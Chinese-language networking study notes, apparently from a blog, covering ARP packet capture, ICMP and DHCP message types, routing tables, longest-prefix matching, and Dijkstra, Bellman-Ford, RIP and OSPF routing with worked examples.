-<h5 id="四个地址"><a href="#四个地址" class="headerlink" title="四个地址"></a>四个地址</h5><p>接下来是四个地址,依次是发送方的物理地址,发送方逻辑地址,接收方硬件地址,接收方逻辑地址</p>
-<h4 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h4><p>如图拓扑中</p>
-<p><a href="mailto:&#65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#50;&#x35;&#49;">&#65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#50;&#x35;&#49;</a>试图ping <a href="mailto:&#x42;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#49;&#x2e;&#50;&#x35;&#x30;">&#x42;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#49;&#x2e;&#50;&#x35;&#x30;</a></p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101172908748.png" alt="image-20221101172908748"></p>
-<p>在A的Ethernet0网卡上抓包</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173100332.png" alt="image-20221101173100332"></p>
-<p>会发现首先发送和接受的并不是ICMP报文,而是arp报文,因为此时A计算机并不知道<a href="mailto:&#66;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#53;&#x30;">&#66;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#53;&#x30;</a>的物理地址是多少.因此首先要问一下</p>
-<p>第20帧,A向子网发送ARP广播,其报文中包括自己的物理地址,逻辑地址,目的地的逻辑地址,但是目的地址的物理地址是一个假值</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173242804.png" alt="image-20221101173242804"></p>
-<p>第21帧,A接收到了B的单播回答</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173435707.png" alt="image-20221101173435707"></p>
-<p>此时两个主机的物理地址,逻辑地址都已经填好了</p>
-<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>internet control message protocol 因特网控制协议,网络层协议</p>
-<p>ICMP是<strong>网络层的协议</strong>,但是其在数据帧中的位置类似于TCP数据报的位置,都是在IPv4的data位置</p>
-<h4 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234511301.png" alt="image-20221101234511301"></p>
-<h5 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h5><p>ICMP报文分成差错报告和查询两种,体现在Type上</p>
-<p>对于差错报告报文:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234922337.png" alt="差错报告类型"></p>
-<p>对于查询报文:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234949153.png" alt="查询类型"></p>
-<h5 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h5><p>代码要视报文类型决定</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101235149110.png" alt="image-20221101235149110"></p>
-<h5 id="Checksum"><a href="#Checksum" class="headerlink" title="Checksum"></a>Checksum</h5><p>校验和</p>
-<h4 id="差错报告报文"><a href="#差错报告报文" class="headerlink" title="差错报告报文"></a>差错报告报文</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❏  对于携带ICMP差错报文的数据报，不再生产ICMP差错报文。</span><br><span class="line">❏  对分段的数据报文，只对第一个分段产生ICMP差错报文。</span><br><span class="line">❏  对于多播地址的数据报文，不产生ICMP差错报文。</span><br><span class="line">❏ 具有特殊地址的数据报文，如127.0.0.0或者0.0.0.0，不产生ICMP差错报文。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>差错报文数据字段:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212160806776.png" alt="image-20230212160806776"></p>
-<table>
-<thead>
-<tr>
-<th>差错报告类型</th>
-<th>作用</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>目的端不可达</td>
-<td>路由器无法路由或者目的主机无法传递数据时,报告目的端不可达</td>
-<td></td>
-</tr>
-<tr>
-<td>源端抑制</td>
-<td>配合流量控制使用<br />路由器或者目的主机发生拥塞时,丢弃数据包,发送源端抑制</td>
-<td></td>
-</tr>
-<tr>
-<td>时间超时</td>
-<td>TTL减为0时,路由器丢弃<br />或者报文的部分分片没有在有限时间抵达目的主机,由目的主机发送</td>
-<td></td>
-</tr>
-<tr>
-<td>参数问题</td>
-<td>IP分组首部错误<br />路由器或者目的主机丢弃分组并发送参数问题报文</td>
-<td></td>
-</tr>
-<tr>
-<td>重定向</td>
-<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161420556.png" alt="image-20230212161420556" style="zoom:25%;" /><br />向源端报告更好的路由</td>
-<td></td>
-</tr>
-</tbody></table>
-<h4 id="查询报文"><a href="#查询报文" class="headerlink" title="查询报文"></a>查询报文</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161525556.png" alt="image-20230212161525556"></p>
-<table>
-<thead>
-<tr>
-<th>查询报文类型</th>
-<th>作用</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>回送请求和回答</td>
-<td>诊断网络</td>
-<td>ping</td>
-</tr>
-<tr>
-<td>时间戳请求和回答</td>
-<td>确定数据报往返时间,同步</td>
-<td></td>
-</tr>
-<tr>
-<td>地址掩码请求和回答</td>
-<td>获取地址对应掩码</td>
-<td></td>
-</tr>
-<tr>
-<td>路由器询问和通告</td>
-<td>询问路由器是否正常工作</td>
-<td>tracert</td>
-</tr>
-</tbody></table>
-<h5 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/5337919-d1900102224993c8.png" alt="img"></p>
-<h3 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h3><p>DHCP,Dynamic Host Configuration Protocol,动态主机地址分配协议</p>
-<p>其前身是BOOTP(bootrap prottocol),引导程序协议,DHCP兼容BOOTP的功能</p>
-<p>DHCP服务器有一个地址池,存放DHCP服务器可以动态分配的所有地址</p>
-<h4 id="DHCP工作过程"><a href="#DHCP工作过程" class="headerlink" title="DHCP工作过程"></a>DHCP工作过程</h4><p>DHCP握手分为四步,主机要离开子网的时候,只有一步</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101233453767.png" alt="前四帧握手,最后一帧离开"></p>
-<table>
-<thead>
-<tr>
-<th>DHCP报文类型</th>
-<th>时机</th>
-<th>方向</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Discover</td>
-<td>client刚加入子网,试图索要一个ip地址</td>
-<td>DHCP client–广播-&gt;DHCP servers</td>
-<td>向所有DHCP server索要ip地址</td>
-</tr>
-<tr>
-<td>Offer</td>
-<td>DHCP server收到了DIscover之后</td>
-<td>DHCP server–单播–&gt;DHCP client</td>
-<td>所有DHCP服务器都会尝试给出一个可用的ip地址</td>
-</tr>
-<tr>
-<td>Request</td>
-<td>client收到Offer之后</td>
-<td>DHCP client–广播–&gt;DHCP servers</td>
-<td>client接受其中一个offer,谢绝其他offer</td>
-</tr>
-<tr>
-<td>ACK</td>
-<td>被接受offer的server收到Request之后</td>
-<td>DHCP server–单播–&gt;DHCP client</td>
-<td>被接受offer的server回复收到</td>
-</tr>
-<tr>
-<td>Release</td>
-<td>client将要离开子网之时</td>
-<td>DHCP client–广播–&gt;DHCP servers</td>
-<td>通知所有DHCP server,本client要放弃ip地址了,可以收回到ip地址池</td>
-</tr>
-</tbody></table>
-<p>其中四次握手同属于一个Transaction</p>
-<h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><p>路由:从某一网络设备发出,去往某个目的地,经过的路径</p>
-<p>终端计算机,路由器,三层交换机上存在路由表</p>
-<p>二层交换机上只有arp表</p>
-<p>根据路由的发现方式,路由可以分成三种</p>
-<p>直连路由:路由器自主发现相连端口的网络的路由</p>
-<p>静态路由:人工维护路由表</p>
-<p>动态路由:可周期性更新</p>
-<h4 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107110756489.png" alt="image-20221107110756489"></p>
-<p>子网掩码</p>
-<p>网络地址</p>
-<p>下一跳地址</p>
-<p>朝向下一跳的端口</p>
-<blockquote>
-<p>比如网络拓扑长这样</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162804137.png" alt="image-20230212162804137"></p>
-<p>其中R1路由表长这样</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162818521.png" alt="image-20230212162818521"></p>
-<p>如果图22.6中的一个目的地址为180.70.65.140的分组到达路由器R1，说明其转发过程。</p>
-<p>180.70.65.140这个地址属于180.70.65.128&#x2F;25网段,因此应该从m0口出去</p>
-<p>首先路由器会在180.70.65.128&#x2F;25网段中使用ARP协议获得下一跳的MAC地址,然后将IP分组转发给下一跳</p>
-</blockquote>
-<h5 id="netstat-r"><a href="#netstat-r" class="headerlink" title="netstat -r"></a>netstat -r</h5><p>在win或者linux主机上使用netstat -r命令即可查看本机的路由表</p>
-<p>比如</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">└─# netstat -r</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">default         Executor        0.0.0.0         UG        0 0          0 eth0</span><br><span class="line">172.29.112.0    0.0.0.0         255.255.240.0   U         0 0          0 eth0</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>栏目</th>
-<th>Destination</th>
-<th>Gateway</th>
-<th>Genmask</th>
-<th>Flags</th>
-<th>MSS Window</th>
-<th>irtt</th>
-<th>Iface</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>意义</td>
-<td>目的地址</td>
-<td>网关</td>
-<td>目的地址掩码</td>
-<td></td>
-<td></td>
-<td></td>
-<td>目标端口</td>
-</tr>
-</tbody></table>
-<p>在eNSP路由器上用display ip routing-table也可以查看该路由器的路由表</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]display ip routing-table</span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Routing Tables: Public</span><br><span class="line">         Destinations : 2        Routes : 2        </span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0</span><br><span class="line">      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0</span><br></pre></td></tr></table></figure>
-
-<p>两者的主要区别就是这个NextHop</p>
-<p>主机的网卡不需要下一跳地址,只需要维护一个网关的地址</p>
-<p>路由器需要维护下一条的地址</p>
-<h5 id="最长掩码匹配"><a href="#最长掩码匹配" class="headerlink" title="最长掩码匹配"></a>最长掩码匹配</h5><p>从路由表中选择具有最长掩码的路由</p>
-<p>掩码越长,地址块越小,路由越具体</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163420071.png" alt="image-20230212163420071"></p>
-<p>假如R2路由器收到了一个目的地址为140.24.7.192的地址,</p>
-<p>该目的地址即属于140.24.7.192&#x2F;26网段,</p>
-<p>又属于140.24.7.0&#x2F;24网段,</p>
-<p>应该发往最长具有掩码的网段,即140.24.7.192&#x2F;26</p>
-<h5 id="地址聚合"><a href="#地址聚合" class="headerlink" title="地址聚合"></a>地址聚合</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163621450.png" alt="image-20230212163621450"></p>
-<h5 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h5><p>默认路由就这种</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113423289.png" alt="image-20221107113423289"></p>
-<p>子网掩码是0,意味着默认路由在路由表中排在最后,也就是最后的选择.</p>
-<p>只要是前面都失配的包都会从默认路由这里匹配成功.该条记录只需要记录从本路由器中的哪个端口出去,下一条是谁</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113605164.png" alt="image-20221107113605164"></p>
-<p>比如这里的B路由器,除了10.1.0.0&#x2F;24,其他的包只能发往C路由器,于是B-&gt;C这条路由就是B的默认路由</p>
-<h4 id="路由协议优先级"><a href="#路由协议优先级" class="headerlink" title="路由协议优先级"></a>路由协议优先级</h4><p>直连路由的优先级最高,因为 其最可靠</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107112300287.png" alt="image-20221107112300287"></p>
-<p>IP路由表为路由器实际工作时使用的路由表</p>
-<p>建立该表的过程中可能考虑了很多路由协议,比如RIP,OSPF,对于同一个Destination的路由记录,优先使用高优先级路由协议给出的路由记录</p>
-<p>比如之类对于24.10.0&#x2F;24这个地址,RIP和OSPF两种协议给出了不同的下一跳,必然有优劣.由于OSPF协议的优先级高,最终写入IP路由表的,来自OSPF协议</p>
-<h4 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h4><h5 id="dijkstra"><a href="#dijkstra" class="headerlink" title="dijkstra"></a>dijkstra</h5><p>边权是链路代价,两节点不连接时链路代价为无穷大</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png" alt="image-20230212163803322"></p>
-<p>符号约定:</p>
-<table>
-<thead>
-<tr>
-<th>符号</th>
-<th>意义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>T</td>
-<td>已经”拓展”的节点集合</td>
-</tr>
-<tr>
-<td>N</td>
-<td>网络中的节点集合</td>
-</tr>
-<tr>
-<td>s</td>
-<td>源点</td>
-</tr>
-<tr>
-<td>w(i,j)</td>
-<td>从i到j节点的链路代价</td>
-</tr>
-<tr>
-<td>L(i)</td>
-<td>目前从源点s到i节点的最小代价</td>
-</tr>
-</tbody></table>
-<p>以1号节点为起点,计算其与其他所有点的最短距离</p>
-<p>计算过程:</p>
-<table>
-<thead>
-<tr>
-<th>Iter</th>
-<th><em>T</em></th>
-<th><em>L</em>(2)</th>
-<th>Path</th>
-<th><em>L</em>(3)</th>
-<th>Path</th>
-<th><em>L</em>(4)</th>
-<th>Path</th>
-<th><em>L</em>(5)</th>
-<th>Path</th>
-<th><em>L</em>(6)</th>
-<th>Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>{1}</td>
-<td>2</td>
-<td>1-2</td>
-<td>5</td>
-<td>1-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>∞</td>
-<td>-</td>
-<td>∞</td>
-<td>-</td>
-</tr>
-<tr>
-<td>2</td>
-<td>{1,4}</td>
-<td>2</td>
-<td>1-2</td>
-<td>4</td>
-<td>1-4-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>∞</td>
-<td>-</td>
-</tr>
-<tr>
-<td>3</td>
-<td>{1, 2, 4}</td>
-<td>2</td>
-<td>1-2</td>
-<td>4</td>
-<td>1-4-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>∞</td>
-<td>-</td>
-</tr>
-<tr>
-<td>4</td>
-<td>{1, 2, 4, 5}</td>
-<td>2</td>
-<td>1-2</td>
-<td>3</td>
-<td>1-4-5-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>4</td>
-<td>1-4-5-6</td>
-</tr>
-<tr>
-<td>5</td>
-<td>{1, 2, 3, 4, 5}</td>
-<td>2</td>
-<td>1-2</td>
-<td>3</td>
-<td>1-4-5-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>4</td>
-<td>1-4-5-6</td>
-</tr>
-<tr>
-<td>6</td>
-<td>{1, 2, 3, 4, 5, 6}</td>
-<td>2</td>
-<td>1-2</td>
-<td>3</td>
-<td>1-4-5-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>4</td>
-<td>1-4-5-6</td>
-</tr>
-</tbody></table>
-<h5 id="bellmanford"><a href="#bellmanford" class="headerlink" title="bellmanford"></a>bellmanford</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png" alt="image-20230212163803322"></p>
-<p>$L_h(i)$从源点到i点,最多经过h条链路时,最小链路代价和</p>
-<p>计算过程</p>
-<table>
-<thead>
-<tr>
-<th><em>h</em></th>
-<th>$L_h(2)$</th>
-<th>Path</th>
-<th>$L_h(3)$</th>
-<th>Path</th>
-<th>$L_h(4)$</th>
-<th>Path</th>
-<th>$L_h(5)$</th>
-<th>Path</th>
-<th>$L_h(6)$</th>
-<th>Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td>∞</td>
-<td>-</td>
-<td>∞</td>
-<td>-</td>
-<td>∞</td>
-<td>-</td>
-<td>∞</td>
-<td>-</td>
-<td>∞</td>
-<td>-</td>
-</tr>
-<tr>
-<td>1</td>
-<td>2</td>
-<td>1-2</td>
-<td>5</td>
-<td>1-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>∞</td>
-<td>-</td>
-<td>∞</td>
-<td>-</td>
-</tr>
-<tr>
-<td>2</td>
-<td>2</td>
-<td>1-2</td>
-<td>4</td>
-<td>1-4-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>10</td>
-<td>1-3-6</td>
-</tr>
-<tr>
-<td>3</td>
-<td>2</td>
-<td>1-2</td>
-<td>3</td>
-<td>1-4-5-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>4</td>
-<td>1-4-5-6</td>
-</tr>
-<tr>
-<td>4</td>
-<td>2</td>
-<td>1-2</td>
-<td>3</td>
-<td>1-4-5-3</td>
-<td>1</td>
-<td>1-4</td>
-<td>2</td>
-<td>1-4-5</td>
-<td>4</td>
-<td>1-4-5-6</td>
-</tr>
-</tbody></table>
-<h4 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h4><p>动态路由协议的目的:</p>
-<p>知道有哪些邻居路由器；</p>
-<p>能够学习到网络中有哪些网段；</p>
-<p>能够学习到至某个网段的所有路径；</p>
-<p>能够从众多的路径中选择最佳的路径；</p>
-<p>能够维护和更新路由信息。</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110756904.png" alt="image-20221114110756904"></p>
-<h5 id="自治系统"><a href="#自治系统" class="headerlink" title="自治系统"></a>自治系统</h5><p>每个自治系统内部使用一套相同的路由协议,同级的自治系统使用同一套路由协议,自治系统可以嵌套自治系统</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212170909097.png" alt="image-20230212170909097"></p>
-<p>每个自治系统都要分配一个AS号,用于路由</p>
-<p>本级自治系统只负责将本级的IP分组发往本级目标自治系统,剩下具体发往目标AS中的哪一台主机,<strong>由该AS内部的路由协议自己决定</strong></p>
-<h5 id="RIP-on-距离向量算法"><a href="#RIP-on-距离向量算法" class="headerlink" title="RIP on 距离向量算法"></a>RIP on 距离向量算法</h5><p>RIP协议基于距离向量协议</p>
-<p>RIP协议中的距离或者说代价,就是跳数</p>
-<p>Distance vector,距离向量算法</p>
-<p>每个节点都有一个</p>
-<h6 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110945325.png" alt="image-20221114110945325"></p>
-<p>最初的拓扑中,每个路由器都只知道与自己直连的路由器.其路由表中只有这些路由器的信息</p>
-<p>比如D实际上式不知道B的存在的,它只知道A的存在.上图中的D的路由表中画出 BCE,但是距离是$\infin$,就相当于不知道它的存在</p>
-<h6 id="共享路由信息-距离向量更新"><a href="#共享路由信息-距离向量更新" class="headerlink" title="共享路由信息&amp;距离向量更新"></a>共享路由信息&amp;距离向量更新</h6><p>周期共享</p>
-<p>每个结点都会将自己知道的所有都告诉邻居</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111341938.png" alt="image-20221114111341938"></p>
-<p>这里C共享给A的所有信息都要代价+2,这是AC之间的边权</p>
-<p>C发往A的所有信息,其Next都是C,意思是,如果A需要使用该表中的一些信息,一定是C的贡献,届时A会以C作为下一跳发送相应数据包</p>
-<p>A的老路由表和加上AC边权代价之后的C共享表进行比较,每一条路由都取Cost最小值,得到新路由表</p>
-<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点:"></a>缺点:</h6><p>两个节点的不稳定性</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111751153.png" alt="image-20221114111751153"></p>
-<p>当A与X之间的链路断开后,A到X的距离成为无穷大,如果因为丢包等原因,A没有及时通知B,X已经断开了,那么B就一直认为B-&gt;A-&gt;X这条链路正常.当B给A交换路由信息的时候,A又认为B还有其他通路到X(实际上就是之前的链路).于是A有到X的包就会发往B,B又发往A,A又发往B…</p>
-<p>三个节点的不确定性:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212172241217.png" alt="image-20230212172241217"></p>
-<p>X已经不和ABC连接了,A一开始也是知道X已经离开的,但是经过共享后,ABC都糊涂了</p>
-<h6 id="基于距离向量的RIP协议"><a href="#基于距离向量的RIP协议" class="headerlink" title="基于距离向量的RIP协议"></a>基于距离向量的RIP协议</h6><p>就是将链路代价换成跳数</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212173742433.png" alt="image-20230212173742433"></p>
-<h5 id="OSPF-on-链路状态路由选择算法"><a href="#OSPF-on-链路状态路由选择算法" class="headerlink" title="OSPF on 链路状态路由选择算法"></a>OSPF on 链路状态路由选择算法</h5><p>链路状态:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182013525.png" alt="image-20230212182013525"></p>
-<p>每个节点都知道一些链路信息,比如链路代价,连接状态</p>
-<p>每个节点都会字节建立一张路由表,通过洪范向其他节点广播状态</p>
-<p>每个节点自己构建一个最短路径树,并以此构建路由表</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182406755.png" alt="image-20230212182406755"></p>
-<p>最短路径树:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182518356.png" alt="image-20230212182518356"></p>
 
       
     </div>
